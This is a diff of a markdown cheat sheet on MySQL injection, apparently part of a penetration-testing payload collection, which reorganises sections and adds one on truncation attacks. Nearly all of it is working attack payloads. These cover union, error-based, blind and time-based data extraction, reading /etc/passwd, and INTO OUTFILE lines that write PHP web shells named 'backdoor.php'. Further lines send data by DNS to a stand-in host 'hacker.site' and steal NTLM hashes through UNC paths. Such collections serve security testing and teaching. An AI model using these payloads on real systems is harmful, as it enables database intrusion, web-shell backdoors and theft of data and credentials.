@@ -1,6 +1,32 @@
 # MYSQL Injection
 
-## MYSQL
+## Summary
+
+* [MYSQL Comment](#mysql-comment)
+* [Detect columns number](#detect-columns-number)
+* [MYSQL Union Based](#mysql-union-based)
+    * [Extract database with information_schema](#extract-database-with-information-schema)
+    * [Extract data without information_schema](#extract-data-without-information-schema)
+    * [Extract data without columns name](#extract-data-without-columns-name)
+* [MYSQL Error Based - Basic](#mysql-error-based---basic)
+* [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
+* [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
+* [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
+* [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
+* [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
+* [MYSQL Blind with LIKE](#mysql-blind-with-like)
+* [MYSQL Time Based](#mysql-time-based)
+* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
+* [MYSQL Read content of a file](#mysql-read-content-of-a-file)
+* [MYSQL Write a shell](#mysql-write-a-shell)
+* [MYSQL Truncation](#mysql-truncation)
+* [MYSQL Out of band](#mysql-out-of-band)
+    * [DNS exfiltration](#dns-exfiltration)
+    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+* [References](#references)
+
+
+## MYSQL comment
 
 ```sql
 # MYSQL Comment
@@ -9,9 +35,12 @@
 /*!32302 10*/ Comment for MYSQL version 3.23.02
 ```
 
-## Detect columns number
 
-Using a simple ORDER
+## MYSQL Union Based
+
+### Extract database with information_schema
+
+First you need to know the number of columns, you can use `order by`.
 
 ```sql
 order by 1
@@ -21,7 +50,7 @@ order by 3
 order by XXX
 ```
 
-## MYSQL Union Based
+Then the following codes will extract the databases'name, tables'name, columns'name.
 
 ```sql
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
@@ -59,7 +88,7 @@ Method for `MySQL 5`
 ...
 ```
 
-### Extract data without information_schema 
+### Extract data without columns name 
 
 Extracting data from the 4th column without knowing its name.
 
@@ -154,7 +183,7 @@ AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
 AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
-## MYSQL Blind with wildcard character
+## MYSQL Blind with LIKE
 
 ['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
 
@@ -192,7 +221,7 @@ Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The
 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 ```
 
-## MYSQL DROP SHELL
+## MYSQL Write a shell
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
@@ -202,6 +231,10 @@ SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
+## MYSQL Truncation
+
+In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+
 ## MYSQL Out of band
 
 ```powershell
@@ -209,14 +242,14 @@ select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
 select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
 ```
 
-DNS exfiltration
+### DNS exfiltration
 
 ```sql
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
 ```
 
-UNC Path - NTLM hash stealing
+### UNC Path - NTLM hash stealing
 
 ```sql
 select load_file('\\\\error\\abc');
@@ -231,3 +264,4 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
 - [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
 - [Help по MySql инъекциям - rdot.org](https://rdot.org/forum/showpost.php?p=114&postcount=1)
+- [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
